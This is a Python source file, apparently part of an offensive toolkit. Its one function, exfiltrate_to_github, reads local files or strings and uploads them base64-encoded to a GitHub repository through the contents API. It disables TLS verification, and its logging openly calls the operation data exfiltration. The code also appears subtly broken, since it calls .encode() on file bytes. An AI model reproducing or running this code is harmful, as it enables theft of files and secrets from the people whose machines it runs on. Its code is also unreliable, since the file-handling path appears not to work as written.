import base64
import requests
import os
import logging

def exfiltrate_to_github(token, owner, repo, path, content, is_file=False):
    logging.debug("Using GitHub exfiltration")
    """
    Exfiltrate data to a file in a GitHub repository.

    Args:
    - token: a string, the GitHub personal access token
    - owner: a string, the owner of the repository
    - repo: a string, the repository to create/update the file in
    - path: a string, the path to the file in the repository
    - content: a string or a list of strings, the content to write to the file if is_file is False; otherwise, the path of the file to exfiltrate
    - is_file: a boolean, if True, content is treated as a file path; otherwise, as a string or a list of strings

    Returns:
    - a boolean indicating whether the data exfiltration was successful
    """
    api_url = f"https://api.github.com/repos/{owner}/{repo}/contents/{path}"
    headers = {"Authorization": f"token {token}"}

    if is_file:
        logging.debug("Exfiltrating file")
        if not os.path.isfile(content):
            logging.error(f"File {content} not found")
            return False
        with open(content, "rb") as f:
            logging.debug("Reading file")
            content = f.read()
    elif isinstance(content, list):
        logging.debug("Exfiltrating list of strings")
        content = '\n'.join(content)

    content_b64 = base64.b64encode(content.encode()).decode()
    data = {"message": f"Update {path}", "content": content_b64}
    logging.debug("Sending request to GitHub API")

    # Get the file to see if it already exists
    response = requests.get(api_url, headers=headers)
    logging.debug(f"Response: {response.status_code}")

    if response.status_code == 200:
        # The file already exists, update it
        data["sha"] = response.json()["sha"]
        logging.debug("File already exists, updating it")

    logging.debug("Sending request to GitHub API")
    response = requests.put(api_url, headers=headers, json=data, verify=False)
    logging.debug(f"Response: {response.status_code}")

    if response.status_code == 200 or response.status_code == 201:
        logging.debug("data exfiltration over git successful!")
        return True
    else:
        logging.warning(f"Failed to exfiltrate data over git")
        return False